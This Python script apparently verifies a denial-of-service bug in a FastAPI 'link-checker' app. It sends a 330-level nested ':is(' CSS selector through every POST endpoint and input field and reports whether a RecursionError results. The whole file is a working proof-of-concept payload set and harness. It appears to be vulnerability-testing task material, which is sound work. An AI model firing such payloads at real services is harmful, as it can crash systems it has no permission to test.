"""Try to push a deeply nested selector into every POST endpoint of link-checker.

Usage: <app>/.venv/bin/python verify_trigger.py <app_dir>
Exit 0 if a RecursionError came out of the app (raised or as a 500), else 1.
"""

import logging
import sys
import warnings
from pathlib import Path

DEPTH = 330
SELECTOR = ":is(" * DEPTH + "p" + ")" * DEPTH
ENDPOINTS = ["/links", "/summary"]


def payloads():
    s = SELECTOR
    attr = s.replace('"', "&quot;")
    return [
        ("page text", {"html": f"<p>{s}</p>", "base_url": None}),
        ("raw body", {"html": s, "base_url": None}),
        ("title", {"html": f"<title>{s}</title>", "base_url": None}),
        ("attribute", {"html": f'<a href="/x" class="{attr}" data-q="{attr}">x</a>', "base_url": None}),
        ("href", {"html": f'<a href="{attr}">x</a><img src="{attr}"><link rel="canonical" href="{attr}">', "base_url": None}),
        ("rel", {"html": f'<link rel="{attr}" href="/c"><a rel="{attr}" href="/y">y</a>', "base_url": None}),
        ("base tag", {"html": f'<base href="{attr}"><a href="z">z</a>', "base_url": None}),
        ("base_url", {"html": '<a href="/a">a</a>', "base_url": s}),
        ("base_url http", {"html": '<a href="/a">a</a>', "base_url": "https://example.com/" + s}),
        ("selector field", {"html": "<p>hi</p>", "base_url": None, "selector": s}),
        ("selectors field", {"html": "<p>hi</p>", "base_url": None, "selectors": [s], "css": s, "query": s}),
    ]


def main() -> int:
    app_dir = Path(sys.argv[1] if len(sys.argv) > 1 else ".").resolve()
    sys.path.insert(0, str(app_dir / "src"))
    warnings.simplefilter("ignore")
    from fastapi.testclient import TestClient
    from link_checker.app import app

    logging.getLogger("httpx").setLevel(logging.WARNING)

    client = TestClient(app, raise_server_exceptions=True)
    n = 0
    for endpoint in ENDPOINTS:
        for label, body in payloads():
            for params in (None, {"selector": SELECTOR}):
                n += 1
                try:
                    resp = client.post(endpoint, json=body, params=params)
                except RecursionError:
                    print(f"TRIGGERED RecursionError at {endpoint} ({label})")
                    return 0
                except Exception as exc:  # other failures are reported, not counted
                    print(f"note: {endpoint} ({label}) raised {type(exc).__name__}", file=sys.stderr)
                    continue
                if resp.status_code >= 500 and "RecursionError" in resp.text:
                    print(f"TRIGGERED RecursionError at {endpoint} ({label}, HTTP {resp.status_code})")
                    return 0
    print(f"NOT TRIGGERED ({n} requests)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
